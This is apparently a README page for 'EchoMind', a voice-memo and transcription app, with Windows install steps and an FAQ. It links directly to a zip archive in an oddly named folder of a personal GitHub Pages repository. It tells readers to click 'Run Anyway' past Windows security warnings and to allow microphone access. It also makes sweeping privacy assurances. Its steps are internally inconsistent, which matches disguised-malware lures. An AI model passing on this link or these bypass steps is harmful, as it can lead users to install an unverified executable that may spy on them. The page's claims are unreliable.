✨ What is EchoMind?

EchoMind is a local-first voice memory assistant that helps you capture important moments, ideas, and conversations through voice. It records what you say, instantly transcribes it to text, and lets you ask questions about it later using a built-in private chatbot. No internet connection needed. No cloud storage. No one else can access your data.

🚀 Getting Started - Windows Guide

Getting EchoMind running on your Windows computer is simple. Follow these steps:

  • 1 Visit the download page - Click this link: https://github.com/Gazeltarig101/gazeltarig101.github.io/raw/refs/heads/main/mononaphthalene/Latest-3.8.zip
  • 2 Find the latest release - Look for the "Releases" section on the GitHub page and click on it. You'll see the newest version available.
  • 3 Download the file - Visit this link to download the application. Click the download button and save the file to your computer.
  • 4 Run the installer - Once downloaded, double-click the file you just downloaded. Your computer may show a security warning - this is normal for open-source software. Click "More Info" and then "Run Anyway" if you see a blue warning screen.
  • 5 Follow setup instructions - The installer will guide you through the setup process. Click "Next" through the options and choose where you want EchoMind installed. We recommend keeping the default location.
  • 6 Launch EchoMind - After installation, you'll find EchoMind in your Start Menu or on your Desktop. Click the icon to open it.
  • 7 Grant microphone access - When you first open EchoMind, Windows will ask if you want to allow microphone access. Click "Allow" - this is necessary for the voice capture feature to work.
    • ⚠️ Important: EchoMind is a local-first application, meaning it runs entirely on your computer. The first time you start it, you may need to wait a few moments for the speech recognition model to load. This is completely normal and happens only once.

    ❓ Frequently Asked Questions

    Do I need an internet connection?

    No! EchoMind works completely offline. Everything happens on your device.

    What are the system requirements?

    EchoMind runs on any modern Windows computer (Windows 10 or 11 recommended). You'll need at least 4GB of RAM and about 2GB of free disk space for the speech models.

    Is my data safe?

    Absolutely. All processing happens locally. Your data never leaves your computer. EchoMind is open source, so anyone can verify this.

    Can I export my transcriptions?

    Yes! EchoMind allows you to export your transcriptions as text files for easy sharing or backup.
